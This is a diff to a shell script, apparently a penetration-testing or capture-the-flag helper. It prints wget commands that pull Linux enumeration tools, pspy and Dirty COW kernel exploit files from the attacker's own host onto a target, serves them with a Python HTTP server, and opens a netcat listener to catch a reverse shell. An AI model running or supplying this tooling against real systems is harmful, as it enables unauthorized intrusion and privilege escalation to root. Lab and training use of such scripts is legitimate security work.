@@ -35,24 +35,25 @@ echo "\n"
 
 ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
 
-echo "Load any of the files below onto the remote target...\n"
+echo "Startup Instructions:"
+echo "\n"
 
 filename="file.txt"
 while read line
-  do echo "Use 'bash' command for best results:-\n"
-  echo "wget http://$line:8000/SH/LinEnum.sh     - Basic."
-  echo "wget http://$line:8000/SH/LinEnumPlus.sh - Super Recommended."
-  echo "wget http://$line:8000/SH/LinPe.sh       - Recommended."
-  echo "wget http://$line:8000/SH/coffee.sh      - Highly Recommeded."
-  echo "wget http://$line:8000/ELF/pspy32        - Basic."
-  echo "wget http://$line:8000/ELF/pspy64        - Recommeded."
-
-  echo "\nKernel Exploits:-\n"
-  echo "wget http://$line:8000/KERNALS/Kernal_4_4_0.c - Excellent."
+  do
+  echo "wget http://$line:8000/SH/LinEnum.sh"
+  echo "wget http://$line:8000/SH/LinEnumPlus.sh"
+  echo "wget http://$line:8000/SH/LinPe.sh"
+  echo "wget http://$line:8000/ELF/pspy32"
+  echo "wget http://$line:8000/ELF/pspy64"
+  
+  echo "\nKernel Exploits:"
+  echo "wget http://$line:8000/KERNALS/NaughtyCowCompile.sh"
+  echo "wget http://$line:8000/KERNALS/NaughthyCow.c"
 done < $filename
 
 echo ""
 exec python -m SimpleHTTPServer > output.txt &
-nc -lvnp 9001
+rlwrap nc -lvnp 9001
 
 #End
